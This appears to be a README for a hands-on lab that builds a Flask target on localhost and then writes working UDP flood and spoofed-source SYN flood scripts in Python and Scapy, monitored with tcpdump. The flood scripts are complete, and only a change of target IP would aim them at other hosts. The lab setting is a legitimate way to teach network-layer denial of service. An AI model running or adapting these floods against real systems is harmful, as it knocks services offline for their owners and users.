### doslab

A hands-on penetration testing lab for safely simulating **UDP** and **SYN Flood** attacks on a controlled local server. This project is designed to help aspiring red teamers, penetration testers, and cybersecurity learners understand how network-layer denial-of-service attacks work by safely simulating real-world UDP and SYN floods in a controlled lab. By building the attack tools from scratch, observing their effects, and analyzing network behavior, you gain a strong foundation in offensive security, packet manipulation, and ethical exploitation. All outcome are documented in png format under files.

---

#### Project Goal

To simulate and study the behavior of simple denial-of-service (DoS) techniques—specifically **UDP flooding** and **SYN flooding**—against a locally hosted Flask server. This lab demonstrates how network services respond under stress and how basic packet floods can be scripted, launched, and observed in a safe, ethical manner.

---

### What You'll Learn

| Skill                     | Description |
|--------------------------|-------------|
| Packet Crafting        | Generate UDP and TCP SYN packets using Python & Scapy |
| Traffic Flooding       | Simulate network layer floods with multithreading |
| Traffic Inspection     | Analyze live packets using `tcpdump` or Wireshark |
| Protocol Behavior      | Observe how different protocols affect services under attack |
| Ethical Simulation     | Perform safe DoS testing in an isolated lab environment |

---

#### Lab Requirements

- Kali Linux (host or VM)
- Python 3
- Flask (`pip install flask`)
- Scapy (`pip install scapy`)
- tcpdump or Wireshark (for packet capture)

---

#### Steps

#### 1. Create a repository

```bash
mkdir ddoslab && cd ddoslab
```
---

#### 2. Create the server and start it

```bash
vim server.py
```

Include the python script

```python

from flask import Flask
app = Flask(__name__)

@app.route('/')
def home():
    return "Target up!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
```

Run the server 

```bash
python3 server.py
```

You can now access target at http://127.0.0.1:5001 on your browser

---


#### 3. Create and Lauch a multithreded UDP flood

```bash
vim udp_flood.py
```

Input the python script below

```python

import socket, random, threading

target_ip = "127.0.0.1"
target_port = 5001

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    while True:
        sock.sendto(payload, (target_ip, target_port))

# Launch 10 attack threads
for _ in range(10):
    threading.Thread(target=attack, daemon=True).start()

print(f"UDP flooding {target_ip}:{target_port} with 10 threads...")
input("Press Enter to stop...\n")
```

lauch using the below command

```bash
python3 udp_flood.py
```


For monitoring open a seperate terminal for this 

```bash
sudo tcpdump -i lo port 5001
```
---

#### 4. Create and Lauch a SYN Flood with Scapy

```bash
vim syn_flood.py
```

Input the python script below

```python

from scapy.all import IP, TCP, send, RandShort, RandIP
import time

target_ip = "127.0.0.1"
target_port = 5001

def syn_flood():
    print(f"Starting SYN flood on {target_ip}:{target_port}")
    try:
        while True:
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            pkt = ip / tcp
            send(pkt, verbose=False)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

syn_flood()
```

lauch using the below command

```bash
python3 syn_flood.py
```

For monitoring open a seperate terminal for this 

```bash
sudo tcpdump -n -i lo port 5001
```
---
